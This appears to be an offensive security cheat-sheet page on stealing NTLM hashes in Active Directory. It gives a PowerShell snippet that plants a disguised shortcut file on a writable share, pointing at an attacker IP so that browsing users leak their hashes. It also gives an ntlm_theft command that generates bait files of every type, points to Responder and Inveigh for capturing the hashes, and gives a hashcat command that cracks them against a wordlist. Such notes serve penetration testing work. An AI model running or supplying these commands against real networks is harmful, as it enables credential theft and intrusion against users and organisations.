---
tags:
  - AD
---

## Theft Files
___
Any writable directory (shares, nfs, locally) where users will list contents you can use certain file types to steal hashes

**Manual: (.lnk)**

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("\\DC01.domain.local\OpenShare\IT-Driver.lnk")
$lnk.TargetPath = "\\<AttackerIP>\@ico.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "IT Driver"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

**Automated (multi-type):**

[https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

Generate all file types:

```shell-session
python3 ntlm_theft.py -g all -s <attackerIP> -f '@myfile'
```

Monitor for traffic with [Responder](https://github.com/SpiderLabs/Responder) on linux or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) on windows. 
Hash received? Try to crack it
``` bash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
```

OR:  [Relay Attacks](Relay%20Attacks.md)


## Poisoning
___
- [LLMNR Poisoning](../2.%20Initial%20Compromise/LLMNR%20Poisoning.md)
- [IPv6 Attacks](../2.%20Initial%20Compromise/IPv6%20Attacks.md)

## Relaying
___
- [Relay Attacks](Relay%20Attacks.md)

## Misc Locations
___

- [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

